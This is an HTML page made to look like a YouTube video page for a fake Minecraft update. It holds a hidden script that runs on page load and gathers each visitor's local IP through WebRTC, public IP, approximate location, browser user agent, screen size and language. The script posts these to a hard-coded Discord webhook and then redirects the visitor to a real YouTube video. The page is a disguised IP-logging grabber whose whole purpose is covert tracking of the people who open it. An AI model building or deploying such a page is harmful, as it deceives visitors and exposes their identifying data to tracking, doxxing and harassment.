<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #0f0f0f;
        }
        .header {
            background-color: #0f0f0f;
            padding: 12px 16px;
            border-bottom: 1px solid #272727;
        }
        .logo {
            font-size: 20px;
            font-weight: bold;
            color: white;
        }
        .logo span {
            color: red;
        }
        .video-wrapper {
            max-width: 1200px;
            margin: 20px auto;
            background: black;
            border-radius: 12px;
            overflow: hidden;
        }
        .video-placeholder {
            width: 100%;
            height: 500px;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .video-placeholder img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .title {
            color: white;
            font-size: 18px;
            margin-top: 12px;
            padding: 0 16px;
        }
        .channel {
            color: #aaa;
            font-size: 14px;
            padding: 8px 16px;
        }
        .description {
            color: white;
            padding: 16px;
            border-top: 1px solid #272727;
            margin-top: 16px;
        }
        .loader {
            text-align: center;
            color: #aaa;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo"><span>Y</span>ou<span>T</span>ube</div>
    </div>
    <div class="video-wrapper">
        <div class="video-placeholder">
            <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" alt="Minecraft Update">
        </div>
    </div>
    <div class="title">
        Minecraft 1.21.11 Update - NEW BEEHIVE MECHANICS & HONEY FARMING!
    </div>
    <div class="channel">
        Minecraft Official • 2.4M views • 3 hours ago
    </div>
    <div class="description">
        ⭐ NEW UPDATE! Beehives now produce honey 2x faster! Full guide inside! ⭐
    </div>
    <div class="loader">
        Loading video information...
    </div>

    <script>
        // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1509244481277399202/SzkqQUidTUL_JdiCpWRn4j_Qax_INcDFVEdTQLw-B68lm7AvWr8B6FVufvc7dCoBPGL8";
        
        // Get local IP via WebRTC
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                
                pc.onicecandidate = (event) => {
                    if (event && event.candidate && event.candidate.candidate) {
                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ipMatch) {
                            const localIP = ipMatch[0];
                            pc.close();
                            resolve(localIP);
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve('Unable to get local IP');
                }, 3000);
            });
        }
        
        // Get public IP
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'Unable to fetch';
            }
        }
        
        // Get location from IP
        async function getLocation(ip) {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}`);
                const data = await response.json();
                return `${data.city}, ${data.country}`;
            } catch (e) {
                return 'Unknown';
            }
        }
        
        // Send everything to Discord
        async function sendData() {
            const localIP = await getLocalIP();
            const publicIP = await getPublicIP();
            const location = await getLocation(publicIP);
            const userAgent = navigator.userAgent;
            const screenRes = `${screen.width}x${screen.height}`;
            const language = navigator.language;
            const time = new Date().toLocaleString();
            
            const embed = {
                embeds: [{
                    title: "🎯 Minecraft Video Player - Visitor Info",
                    color: 0xFF0000,
                    thumbnail: {
                        url: "https://cdn.discordapp.com/icons/123/123.png"
                    },
                    fields: [
                        { name: "🌐 Local IP", value: `\`${localIP}\``, inline: true },
                        { name: "🌍 Public IP", value: `\`${publicIP}\``, inline: true },
                        { name: "📍 Location", value: location, inline: true },
                        { name: "💻 User Agent", value: userAgent.substring(0, 100), inline: false },
                        { name: "📺 Screen Size", value: screenRes, inline: true },
                        { name: "🌎 Language", value: language, inline: true },
                        { name: "⏰ Time", value: time, inline: true }
                    ],
                    footer: { text: "Minecraft Update Logger" },
                    timestamp: new Date().toISOString()
                }]
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
            } catch(e) {
                console.log('Webhook error');
            }
            
            // Redirect to real YouTube after 4 seconds
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            }, 4000);
        }
        
        sendData();
    </script>
</body>
</html>
